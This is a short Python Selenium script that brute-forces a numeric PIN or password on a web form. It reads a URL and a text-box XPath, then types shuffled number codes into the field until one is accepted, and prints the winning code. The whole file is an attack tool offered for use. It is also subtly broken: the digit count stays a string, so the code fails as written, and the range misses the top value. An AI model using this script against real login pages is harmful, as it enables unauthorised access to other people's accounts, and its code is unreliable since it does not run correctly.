
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import random

# getting variables
url = input("please insert the url: ")
box = input("please insert the xpath of the text box: ")
n = input("how many digits you want to put?\n")
passwords_list = []

driver = webdriver.Chrome()
driver.get(url)
driver.implicitly_wait(2)

user = driver.find_element_by_xpath(box)

for i in range(0, int("9" * n)):
    passwords_list.append(i)
random.shuffle(passwords_list)
for password in passwords_list:

    try:
        user.send_keys(str(password).zfill(n))
        user.send_keys(Keys.RETURN)
        user = driver.find_element_by_xpath(box)
    except:
        print(password)
        break
    user.clear()


